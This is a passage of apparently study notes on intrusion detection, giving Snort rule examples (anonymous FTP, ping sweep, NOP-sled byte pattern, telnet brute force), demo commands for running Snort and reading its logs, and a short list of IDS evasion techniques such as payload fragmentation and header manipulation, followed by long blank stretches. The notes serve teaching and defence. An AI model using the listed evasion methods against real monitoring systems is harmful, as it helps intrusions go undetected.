          limit to be exceeded
* seconds - time period over which count is accrued. [s] must be nonzero value

## Snort rule example (CMD)

    Look for anonymous ftp traffic:

    alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous";
    sid:2121; )

    This will cause the pattern matcher to start looking at byte 6 in the payload)

    alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous"; offset:5; sid:2121; )

    This will search the first 14 bytes of the packet looking for the word “anonymous”.

    alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous";
    depth:14; sid:2121; )

    Deactivates the case sensitivity of a text search.

    alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous";
    nocase; sid:2121; )

    ICMP ping sweep

    alert icmp any any -> 10.10.0.40 any (msg: "NMAP ping sweep Scan";
    dsize:0; itype:8; icode:0; sid:10000004; rev: 1; )

    Look for a specific set of Hex bits (NoOP sled)

    alert tcp any any -> any any (msg:"NoOp sled"; content: "|9090 9090 9090|";
    sid:9090; rev: 1; )

    Telnet brute force login attempt

    alert tcp any 23 -> any any (msg:"TELNET login incorrect";
    content:"Login incorrect"; nocase; flow:established, from_server;
    threshold: type both, track by_src, count 3, seconds 30;
    classtype: bad-unknown; sid:2323; rev:6; )


## DEMO (CMD) SNORT

snort --version

snort -D -l /var/log/snort/ -c /etc/snort/snort.conf

ps -elf | grep snort

ls /etc/snort/rules
icmp.rules

alert icmp any any -> any any (msg:ICMP Detect; sid 1; rev 1;)

cd /var/log/snort
ls /ver/log/snort
cat snort.log.1234654123

sudo tcpdump -r snort.log1234654123 -XX -vv -n 

ps -elf | grep snort

sudo pkill snort



## IDS/IPS Performance

    True Positive (TP)

    True Negative (TN)

    False Positive (FP)

    False Negative (FN)


![image](https://github.com/user-attachments/assets/0a142e1c-026f-4d09-80aa-2fd59e475528)



## Technical Attacks on IDS/IPS

    packet sequence manipulation

    fragmenting payload

    overlapping fragments with different reassembly by devices

    Manipulating TCP headers

    Manipulating IP options

    Sending data during the TCP connection setup



## Non-Technical attacks against IDS/IPS


    attacking during periods of low manning
    Example - Ramadan 2012 Saudi Aramco attack

    attacking during a surge in activity
    Example - Target Corp. Point of Sale machines during the Thanksgiving-Christmas 2013 shopping season




## Strengthening Defensive Systems

    Linking IDS/IPS to other tools

    Multiconfig

    Tuning

    HIDS and File Integrity






     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     











     






















     












     






















     











     






















     











     






















     











     






















     











     






